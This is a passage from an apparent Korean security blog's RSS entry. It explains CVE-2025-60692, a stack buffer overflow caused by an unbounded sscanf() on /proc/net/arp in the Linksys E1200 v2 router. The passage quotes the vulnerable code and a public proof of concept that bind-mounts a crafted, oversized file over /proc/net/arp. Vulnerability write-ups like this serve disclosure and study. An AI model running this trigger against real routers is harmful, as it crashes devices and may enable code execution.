&#xD30C;&#xC2F1;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC785;&#xB825; &#xAE38;&#xC774;&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC99D; &#xC5C6;&#xC774; <code>sscanf()</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">if</span> (<span class="hljs-built_in">sscanf</span>(line, <span class="hljs-string">&quot;%s 0x%x 0x%x %100s %100s %100s\n&quot;</span>,                    v6,                              &amp;flags1,                    &amp;flags2,                    v7,                    &amp;v7[<span class="hljs-number">50</span>],                    &amp;v7[<span class="hljs-number">100</span>]                )</code></pre><p><code>v6</code> &#xBC84;&#xD37C;&#xB294; &#xD06C;&#xAE30;&#xAC00; 50&#xBC14;&#xC774;&#xD2B8;&#xC784;&#xC5D0;&#xB3C4; %s&#xC5D0; &#xB300;&#xD55C; &#xAE38;&#xC774; &#xC81C;&#xD55C;&#xC774; &#xC5C6;&#xC73C;&#xBA70;, <code>v7</code> &#xC5ED;&#xC2DC; 150&#xBC14;&#xC774;&#xD2B8; &#xBC84;&#xD37C;&#xC5D0; &#xB300;&#xD574; &#xCD5C;&#xB300; 300&#xBC14;&#xC774;&#xD2B8;&#xAE4C;&#xC9C0; &#xC4F0;&#xAE30; &#xAC00;&#xB2A5;&#xD558;&#xB3C4;&#xB85D; &#xBD84;&#xD560;&#xB418;&#xC5B4; &#xC788;&#xC5B4; Stack-Based Buffer Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/12/17/barrack/CVE-2025-60692/1.png" alt></p><p>&#xACF5;&#xACA9;&#xC790;&#xAC00; <code>/proc/net/arp</code> &#xB0B4;&#xC6A9;&#xC744; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xB294; &#xD658;&#xACBD;(&#xB85C;&#xCEEC; &#xC811;&#xADFC; &#xB610;&#xB294; &#xD30C;&#xC77C;&#xC2DC;&#xC2A4;&#xD15C; &#xC870;&#xC791;)&#xC774;&#xBA74; &#xD568;&#xC218; &#xD638;&#xCD9C; &#xC2DC; &#xC2A4;&#xD0DD; &#xBA54;&#xBAA8;&#xB9AC; &#xC190;&#xC0C1;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xBA70;, &#xC774;&#xB294; DOS &#xD639;&#xC740; RCE&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Proof-of-Concept"><a href="#Proof-of-Concept" class="headerlink" title="Proof of Concept"></a>Proof of Concept</h2><p>&#xACF5;&#xAC1C;&#xB41C; POC &#xCF54;&#xB4DC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">echo -e <span class="hljs-string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 0x1 0x2 BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB 0x0 0x0&quot;</span> &gt; /tmp/fake_arpmount --bind /tmp/fake_arp /proc/net/arp</code></pre><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://github.com/yifan20020708/SGTaint-0-day/blob/main/Linksys/Linksys-E1200/CVE-2025-60692.md">https://github.com/yifan20020708/SGTaint-0-day/blob/main/Linksys/Linksys-E1200/CVE-2025-60692.md</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Cisco/">Cisco</category>
      
      <category domain="https://hackyboiz.github.io/tags/Linksys/">Linksys</category>
      
      <category domain="https://hackyboiz.github.io/tags/E1200-v2-router/">E1200 v2 router</category>
      
      <category domain="https://hackyboiz.github.io/tags/buffer-over-flow/">buffer over flow</category>
      
      <category domain="https://hackyboiz.github.io/tags/barrack/">barrack</category>
      
      
      <comments>https://hackyboiz.github.io/2025/12/17/barrack/CVE-2025-60692/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
